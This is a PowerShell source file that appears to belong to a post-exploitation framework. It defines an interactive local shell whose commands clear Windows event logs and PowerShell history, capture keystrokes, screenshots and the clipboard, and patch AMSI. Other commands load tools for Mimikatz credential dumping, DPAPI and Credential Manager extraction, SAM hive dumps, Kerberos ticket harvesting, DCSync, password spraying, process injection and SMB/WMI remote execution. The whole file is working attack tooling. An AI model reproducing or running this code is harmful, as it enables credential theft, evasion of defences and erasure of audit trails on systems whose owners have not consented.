function Start-LocalShell {
    $localFQDN  = try { [System.Net.Dns]::GetHostByName($env:COMPUTERNAME).HostName } catch { $env:COMPUTERNAME }
    $localUser  = if ($env:USERDOMAIN -and $env:USERDOMAIN -ne $env:COMPUTERNAME) { "$env:USERDOMAIN\$env:USERNAME" } else { $env:USERNAME }
    $shortHost  = ($localFQDN -split '\.')[0]

    # ── Inline commands (run PS directly, no tool load) ──────────────────────
    $_cmd = @{
        'AV' = {
            $d = Get-MpComputerStatus -ErrorAction SilentlyContinue
            if ($d) {
                Write-Output ''
                Write-Output "  Windows Defender:"
                Write-Output "    Enabled : $($d.AMServiceEnabled)"
                Write-Output "    RTP     : $($d.RealTimeProtectionEnabled)"
                Write-Output "    Sig date: $($d.AntivirusSignatureLastUpdated)"
            }
            $av = Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct -ErrorAction SilentlyContinue
            if ($av) { $av | ForEach-Object { Write-Output "  3rd-party AV: $($_.displayName)" } }
            Write-Output ''
        }
        'Net' = { netstat -ano }
        'Process' = {
            Get-Process | Select-Object Id, ProcessName,
                @{N='CPU(s)';E={if ($_.CPU) {[math]::Round($_.CPU,1)} else {''}}},
                @{N='WS(MB)';E={[math]::Round($_.WorkingSet64/1MB,1)}},
                Path |
                Sort-Object 'WS(MB)' -Descending | Format-Table -AutoSize
        }
        'Services' = {
            Get-Service | Where-Object { $_.Status -eq 'Running' } |
                Select-Object Name, DisplayName, Status | Sort-Object Name | Format-Table -AutoSize
        }
        'Sessions' = {
            try { qwinsta 2>$null } catch {}
            Get-WmiObject Win32_LoggedOnUser -ErrorAction SilentlyContinue |
                Select-Object -ExpandProperty Antecedent |
                ForEach-Object { $_ -replace '.*Name="([^"]+)".*Domain="([^"]+)".*','$2\$1' } |
                Sort-Object -Unique | ForEach-Object { Write-Output "  $_" }
        }
        'Software' = {
            $paths = @(
                'HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*',
                'HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*'
            )
            $paths | ForEach-Object {
                Get-ItemProperty $_ -ErrorAction SilentlyContinue
            } | Where-Object { $_.DisplayName } |
                Select-Object DisplayName, DisplayVersion, Publisher |
                Sort-Object DisplayName | Format-Table -AutoSize
        }
        'Startup' = {
            Write-Output ''; Write-Output '  [Registry Run keys]'
            @('HKCU:\Software\Microsoft\Windows\CurrentVersion\Run',
              'HKLM:\Software\Microsoft\Windows\CurrentVersion\Run',
              'HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run') | ForEach-Object {
                $k = $_
                Get-ItemProperty $k -ErrorAction SilentlyContinue |
                    Get-Member -MemberType NoteProperty -ErrorAction SilentlyContinue |
                    Where-Object { $_.Name -notmatch '^PS' } |
                    ForEach-Object { Write-Output "  $k : $($_.Name)" }
            }
            Write-Output '  [Startup folders]'
            @("$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup",
              'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup') | ForEach-Object {
                if (Test-Path $_) { Get-ChildItem $_ | ForEach-Object { Write-Output "  $_" } }
            }
            Write-Output ''
        }
        'ClearHistory' = {
            $h = (Get-PSReadlineOption -ErrorAction SilentlyContinue).HistorySavePath
            if ($h -and (Test-Path $h)) { Remove-Item $h -Force; Write-Host ' [+] PSReadLine history cleared.' -ForegroundColor Green }
            $others = Get-ChildItem C:\Users\* -Force -ErrorAction SilentlyContinue |
                ForEach-Object { Join-Path $_.FullName 'AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt' } |
                Where-Object { Test-Path $_ }
            $others | ForEach-Object { Remove-Item $_ -Force -ErrorAction SilentlyContinue }
            Write-Host " [+] Cleared $($others.Count) additional history file(s)." -ForegroundColor Green
        }
        'ClearLogs' = {
            Write-Host ' [*] Clearing Windows event logs...' -ForegroundColor Cyan
            wevtutil el | ForEach-Object {
                wevtutil cl "$_" 2>$null
            }
            Write-Host ' [+] Event logs cleared.' -ForegroundColor Green
        }
        'Clipboard' = {
            $c = Get-Clipboard -ErrorAction SilentlyContinue
            if ($c) { Write-Output $c } else { Write-Output '(clipboard empty)' }
        }
        'History' = {
            Get-ChildItem C:\Users\* -Force -ErrorAction SilentlyContinue | ForEach-Object {
                $hFile = Join-Path $_.FullName 'AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt'
                if (Test-Path $hFile) {
                    Write-Host "  === $($_.Name) ===" -ForegroundColor Cyan
                    Get-Content $hFile | ForEach-Object { Write-Output "  $_" }
                }
            }
        }
        'KeylogRead' = {
            if ($global:KeylogFile -and (Test-Path $global:KeylogFile)) {
                Get-Content $global:KeylogFile
            } else {
                Write-Host ' [-] No active keylog file. Start Keylog first and specify path.' -ForegroundColor Red
            }
        }
        'ScreenShot' = {
            try {
                Add-Type -AssemblyName System.Windows.Forms, System.Drawing -ErrorAction Stop
                $scr = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
                $bmp = New-Object System.Drawing.Bitmap($scr.Width, $scr.Height)
                $g   = [System.Drawing.Graphics]::FromImage($bmp)
                $g.CopyFromScreen($scr.Location, [System.Drawing.Point]::Empty, $scr.Size)
                $out = Join-Path $env:TEMP "ss_$(Get-Date -Format 'yyyyMMdd_HHmmss').png"
                $bmp.Save($out); $g.Dispose(); $bmp.Dispose()
                Write-Host " [+] Screenshot saved: $out" -ForegroundColor Green
            } catch { Write-Host " [-] $_" -ForegroundColor Red }
        }
        'Screen4K' = {
            try {
                Add-Type -AssemblyName System.Windows.Forms, System.Drawing -ErrorAction Stop
                $all  = [System.Windows.Forms.Screen]::AllScreens
                $rect = [System.Drawing.Rectangle]::Union(($all | ForEach-Object { $_.Bounds }) -as [System.Drawing.Rectangle[]])
                $bmp  = New-Object System.Drawing.Bitmap($rect.Width, $rect.Height)
                $g    = [System.Drawing.Graphics]::FromImage($bmp)
                $g.CopyFromScreen($rect.Location, [System.Drawing.Point]::Empty, $rect.Size)
                $out  = Join-Path $env:TEMP "ss4k_$(Get-Date -Format 'yyyyMMdd_HHmmss').png"
                $bmp.Save($out); $g.Dispose(); $bmp.Dispose()
                Write-Host " [+] Screenshot (all monitors) saved: $out" -ForegroundColor Green
            } catch { Write-Host " [-] $_" -ForegroundColor Red }
        }
        'TLS' = {
            [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
            Write-Host ' [+] TLS 1.2 enabled for this session.' -ForegroundColor Green
        }
        'GetSystem' = {
            Write-Host ' [-] GetSystem spawns a new pipe session as SYSTEM — not supported in local shell.' -ForegroundColor Yellow
            Write-Host '     Use from a remote session instead.' -ForegroundColor Yellow
        }
        'Migrate' = {
            Write-Host ' [-] Migrate requires PInject loaded and a target PID.' -ForegroundColor Yellow
            Write-Host '     Load PInject first, then call the injection function manually.' -ForegroundColor Yellow
        }
        'MonitorRead' = {
            if ($global:TGTCache -and $global:TGTCache.Count -gt 0) {
                $global:TGTCache | ForEach-Object { Write-Output $_ }
            } else {
                Write-Host ' [-] TGT cache empty. Start Monitor first.' -ForegroundColor Red
            }
        }
        'MonitorClear' = {
            $global:TGTCache = @()
            Write-Host ' [+] TGT monitor cache cleared.' -ForegroundColor Green
        }
    }

    # ── Tool-load keywords ────────────────────────────────────────────────────
    # tools: cache keys to load in order; invoke: expression to auto-run after (null=stay-loaded)
    $_kw = @{
        'Patch'            = @{ tools=@('SimpleAMSI');                                           invoke=$null }
        'PatchNet'         = @{ tools=@('NETAMSI');                                              invoke=$null }
        'PInject'          = @{ tools=@('PInject');                                              invoke=$null }
        'PowerView'        = @{ tools=@('pwv');                                                  invoke=$null }
        'Mimi'             = @{ tools=@('Suntour');                                              invoke=$null }
        'Rubeus'           = @{ tools=@('Ferrari');                                              invoke=$null }
        'Ask4Creds'        = @{ tools=@('Ask4Creds');                                            invoke=$null }
        'AutoMimi'         = @{ tools=@('Suntour');                                              invoke='Mimi -Command "sekurlsa::logonpasswords"' }
        'CredMan'          = @{ tools=@('cms');                                                  invoke='Enum-Creds' }
        'Dpapi'            = @{ tools=@('Dpapi');                                                invoke=$null }
        'HashGrab'         = @{ tools=@('SimpleAMSI','NETAMSI','Invoke-GrabTheHash');           invoke='Invoke-GrabTheHash' }
        'Hive'             = @{ tools=@('HiveDump');                                             invoke='Invoke-HiveDump' }
        'Kerb'             = @{ tools=@('dumper');                                               invoke=$null }
        'Keylog'           = @{ tools=@('klg');                                                  invoke=$null }
        'Monitor'          = @{ tools=@('TGT_Monitor');                                          invoke=$null }
        'PPL'              = @{ tools=@('ppl');                                                  invoke=$null }
        'MultiRDP'         = @{ tools=@('TermsrvPatcher');                                       invoke=$null }
        'CredValidate'     = @{ tools=@('Validate-Credentials');                                 invoke=$null }
        'DCSync'           = @{ tools=@('Sync');                                                 invoke=$null }
        'Impersonation'    = @{ tools=@('Token-Impersonation');                                  invoke=$null }
        'LocalAdminAccess' = @{ tools=@('Find-LocalAdminAccess');                                invoke=$null }
        'PassSpray'        = @{ tools=@('PassSpray');                                            invoke=$null }
        'Remoting'         = @{ tools=@('Invoke-SMBRemoting','Invoke-WMIRemoting');             invoke=$null }
        'SessionHunter'    = @{ tools=@('Invoke-SessionHunter');                                 invoke=$null }
    }

    Write-Output ""
    Write-Host " [+] Local Shell - $localFQDN [$localUser]" -ForegroundColor Green
    Write-Host " [*] Type 'help' for available commands and tools." -ForegroundColor Cyan
    Write-Output ""

    while ($true) {
        Write-Host " ${shortHost}> " -NoNewline -ForegroundColor Yellow
        $cmd = Read-Host
        if (-not $cmd) { continue }
        $cmd = $cmd.Trim()
        if ($cmd -eq '') { continue }

        if ($cmd -eq 'back' -or $cmd -eq 'exit') { break }

        # ── Help ──────────────────────────────────────────────────────────────
        if ($cmd -eq 'help' -or $cmd -eq '?') {
            Write-Output ""
            Write-Host " [+] Shell:" -ForegroundColor Green
            Write-Host "   help / ?          " -NoNewline -ForegroundColor Yellow; Write-Host "This menu"
            Write-Host "   modules           " -NoNewline -ForegroundColor Yellow; Write-Host "List all cached tool names (for use with 'load')"
            Write-Host "   load <name>       " -NoNewline -ForegroundColor Yellow; Write-Host "Load any cached tool by its exact cache name"
            Write-Host "   back / exit       " -NoNewline -ForegroundColor Yellow; Write-Host "Return to session menu"
            Write-Output ""
            Write-Host " [+] Core Commands:" -ForegroundColor Green
            Write-Host "   Download          " -NoNewline -ForegroundColor Yellow; Write-Host "Download file from remote system [file name]"
            Write-Host "   Upload            " -NoNewline -ForegroundColor Yellow; Write-Host "Upload file to remote system [full path]"
            Write-Output ""
            Write-Host " [+] System Commands:" -ForegroundColor Green
            Write-Host "   AV                " -NoNewline -ForegroundColor Yellow; Write-Host "Check local AV"
            Write-Host "   Net               " -NoNewline -ForegroundColor Yellow; Write-Host "Netstat command"
            Write-Host "   Process           " -NoNewline -ForegroundColor Yellow; Write-Host "Display running processes"
            Write-Host "   Services          " -NoNewline -ForegroundColor Yellow; Write-Host "Display running services"
            Write-Host "   Sessions          " -NoNewline -ForegroundColor Yellow; Write-Host "Show active sessions"
            Write-Host "   Software          " -NoNewline -ForegroundColor Yellow; Write-Host "Display installed software"
            Write-Host "   Startup           " -NoNewline -ForegroundColor Yellow; Write-Host "Display startup apps"
            Write-Output ""
            Write-Host " [+] User Activity:" -ForegroundColor Green
            Write-Host "   ClearHistory      " -NoNewline -ForegroundColor Yellow; Write-Host "Clear history for current user"
            Write-Host "   ClearLogs         " -NoNewline -ForegroundColor Yellow; Write-Host "Clear logs from Event Viewer"
            Write-Host "   Clipboard         " -NoNewline -ForegroundColor Yellow; Write-Host "Get the clipboard (text)"
            Write-Host "   History           " -NoNewline -ForegroundColor Yellow; Write-Host "Get pwsh history for all users"
            Write-Host "   Keylog            " -NoNewline -ForegroundColor Yellow; Write-Host "Start keylogger - use: KeyLog ""C:\path\log.txt"""
            Write-Host "   KeylogRead        " -NoNewline -ForegroundColor Yellow; Write-Host "Read keylog output"
            Write-Host "   ScreenShot        " -NoNewline -ForegroundColor Yellow; Write-Host "Take a screenshot [1080p]"
            Write-Host "   Screen4K          " -NoNewline -ForegroundColor Yellow; Write-Host "Take a screenshot [all monitors]"
            Write-Output ""
            Write-Host " [+] Scripts Loading:" -ForegroundColor Green
            Write-Host "   Mimi              " -NoNewline -ForegroundColor Yellow; Write-Host "Load Mimikatz - use: Mimi -Command ""sekurlsa::logonpasswords"""
            Write-Host "   Patch             " -NoNewline -ForegroundColor Yellow; Write-Host "Patch AMSI (stays active this session)"
            Write-Host "   PatchNet          " -NoNewline -ForegroundColor Yellow; Write-Host "Patch AMSI .NET"
            Write-Host "   PInject           " -NoNewline -ForegroundColor Yellow; Write-Host "Load process injection module"
            Write-Host "   PowerView         " -NoNewline -ForegroundColor Yellow; Write-Host "Load PowerView - use: Get-Domain, Find-DomainUser, etc."
            Write-Host "   Rubeus            " -NoNewline -ForegroundColor Yellow; Write-Host "Load Rubeus - use: Rubeus -Command ""triage"""
            Write-Host "   TLS               " -NoNewline -ForegroundColor Yellow; Write-Host "Enable TLS 1.2 for this session"
            Write-Output ""
            Write-Host " [+] Local Actions:" -ForegroundColor Green
            Write-Host "   Ask4Creds         " -NoNewline -ForegroundColor Yellow; Write-Host "Prompt user for credentials"
            Write-Host "   AutoMimi          " -NoNewline -ForegroundColor Yellow; Write-Host "Load Mimikatz and dump credentials immediately"
            Write-Host "   CredMan           " -NoNewline -ForegroundColor Yellow; Write-Host "Dump Windows Credential Manager"
            Write-Host "   Dpapi             " -NoNewline -ForegroundColor Yellow; Write-Host "Retrieve credentials protected by DPAPI"
            Write-Host "   GetSystem         " -NoNewline -ForegroundColor Yellow; Write-Host "Get a SYSTEM shell [remote session only]"
            Write-Host "   HashGrab          " -NoNewline -ForegroundColor Yellow; Write-Host "Attempt to retrieve the hash of the current user"
            Write-Host "   Hive              " -NoNewline -ForegroundColor Yellow; Write-Host "HiveDump - SAM / SYSTEM / SECURITY"
            Write-Host "   Kerb              " -NoNewline -ForegroundColor Yellow; Write-Host "Dump Kerberos TGTs - use: Invoke-Kirby"
            Write-Host "   Migrate <pid>     " -NoNewline -ForegroundColor Yellow; Write-Host "Inject payload into specified PID [requires PInject]"
            Write-Host "   Monitor           " -NoNewline -ForegroundColor Yellow; Write-Host "Monitor cache for TGTs - use: TGT_Monitor"
            Write-Host "   MonitorRead       " -NoNewline -ForegroundColor Yellow; Write-Host "Retrieve TGTs from monitor activity"
            Write-Host "   MonitorClear      " -NoNewline -ForegroundColor Yellow; Write-Host "Clear TGTs from monitor activity"
            Write-Output ""
            Write-Host " [+] Domain Actions:" -ForegroundColor Green
            Write-Host "   CredValidate      " -NoNewline -ForegroundColor Yellow; Write-Host "Validate domain credentials - use: Validate-Credentials"
            Write-Host "   DCSync            " -NoNewline -ForegroundColor Yellow; Write-Host "Perform DCSync - use: Invoke-DCSync"
            Write-Host "   Impersonation     " -NoNewline -ForegroundColor Yellow; Write-Host "Token impersonation - use: Token-Impersonation"
            Write-Host "   LocalAdminAccess  " -NoNewline -ForegroundColor Yellow; Write-Host "Check targets for local admin access"
            Write-Host "   PassSpray         " -NoNewline -ForegroundColor Yellow; Write-Host "Domain password spray - use: Invoke-PassSpray"
            Write-Host "   Remoting          " -NoNewline -ForegroundColor Yellow; Write-Host "Remote command execution SMB/WMI - use: Invoke-SMBRemoting / Invoke-WMIRemoting"
            Write-Host "   SessionHunter     " -NoNewline -ForegroundColor Yellow; Write-Host "Hunt for active user sessions"
            Write-Output ""
            Write-Host " [*] Scenario 1: started via 'runas /netonly', all domain tools" -ForegroundColor DarkCyan
            Write-Host "     (PowerView, SessionHunter, PassSpray, etc.) automatically use" -ForegroundColor DarkCyan
            Write-Host "     your domain credentials for LDAP and SMB." -ForegroundColor DarkCyan
            Write-Output ""
            continue
        }

        # ── Modules list ──────────────────────────────────────────────────────
        if ($cmd -eq 'modules') {
            if ($global:ToolCache.Count -eq 0) {
                Write-Host " [-] Tool cache empty - run 'modules reload' from main menu first." -ForegroundColor Red
            } else {
                Write-Output ""
                $global:ToolCache.Keys | Sort-Object | ForEach-Object { Write-Host "  [+] $_" }
                Write-Output ""
            }
            continue
        }

        # ── Inline command dispatch ───────────────────────────────────────────
        $cmdMatch = $_cmd.Keys | Where-Object { $_ -ieq $cmd } | Select-Object -First 1
        if ($cmdMatch) {
            try { & $_cmd[$cmdMatch] }
            catch { Write-Host " [-] $($_.Exception.Message)" -ForegroundColor Red }
            continue
        }

        # ── Tool-load keyword dispatch ────────────────────────────────────────
        $kwMatch = $_kw.Keys | Where-Object { $_ -ieq $cmd } | Select-Object -First 1
        if ($kwMatch) {
            $kwDef  = $_kw[$kwMatch]
            $allOk  = $true
            $before = @(Get-Command -CommandType Function | Select-Object -ExpandProperty Name)
            foreach ($toolName in $kwDef.tools) {
                $cacheKey = $global:ToolCache.Keys | Where-Object { $_ -ieq $toolName } | Select-Object -First 1
                if ($cacheKey) {
                    try   { Invoke-Expression $global:ToolCache[$cacheKey] }
                    catch { Write-Host " [-] Failed to load ${toolName}: $($_.Exception.Message)" -ForegroundColor Red; $allOk = $false }
                } else {
                    Write-Host " [-] '$toolName' not in cache. Run 'modules reload' or 'serve' from main menu." -ForegroundColor Red
                    $allOk = $false
                }
            }
            if ($allOk) {
                Write-Host " [+] $kwMatch loaded." -ForegroundColor Green
                $after    = @(Get-Command -CommandType Function | Select-Object -ExpandProperty Name)
                $newFuncs = @($after | Where-Object { $before -notcontains $_ })
                if ($newFuncs.Count -gt 0) {
                    $cap = if ($newFuncs.Count -le 12) { $newFuncs -join ', ' } else { ($newFuncs[0..11] -join ', ') + " ... (+$($newFuncs.Count - 12) more)" }
                    Write-Host " [*] Available: $cap" -ForegroundColor Cyan
                }
                if ($kwDef.invoke) {
                    Write-Output ""
                    try   { Invoke-Expression $kwDef.invoke }
                    catch { Write-Host " [-] Auto-invoke failed: $($_.Exception.Message)" -ForegroundColor Red }
                }
            }
            continue
        }

        # ── Explicit load by exact cache name ─────────────────────────────────
        if ($cmd -match '^load\s+(.+)') {
            $modName  = $Matches[1].Trim()
            $cacheKey = $global:ToolCache.Keys | Where-Object { $_ -ieq $modName } | Select-Object -First 1
            if ($cacheKey) {
                $before = @(Get-Command -CommandType Function | Select-Object -ExpandProperty Name)
                try {
                    Invoke-Expression $global:ToolCache[$cacheKey]
                    Write-Host " [+] $cacheKey loaded." -ForegroundColor Green
                    $after    = @(Get-Command -CommandType Function | Select-Object -ExpandProperty Name)
                    $newFuncs = @($after | Where-Object { $before -notcontains $_ })
                    if ($newFuncs.Count -gt 0) {
                        $cap = if ($newFuncs.Count -le 12) { $newFuncs -join ', ' } else { ($newFuncs[0..11] -join ', ') + " ... (+$($newFuncs.Count - 12) more)" }
                        Write-Host " [*] Available: $cap" -ForegroundColor Cyan
                    }
                } catch {
                    Write-Host " [-] Load error: $($_.Exception.Message)" -ForegroundColor Red
                }
            } else {
                Write-Host " [-] '$modName' not in cache. Type 'modules' to list available." -ForegroundColor Red
            }
            continue
        }

        # ── Fall-through: run as PowerShell ───────────────────────────────────
        try {
            $result = Invoke-Expression "$cmd 2>&1"
            if ($null -ne $result) { $result | Out-String | ForEach-Object { Write-Output $_.TrimEnd() } }
        } catch {
            Write-Host " [-] $($_.Exception.Message)" -ForegroundColor Red
        }
    }
}
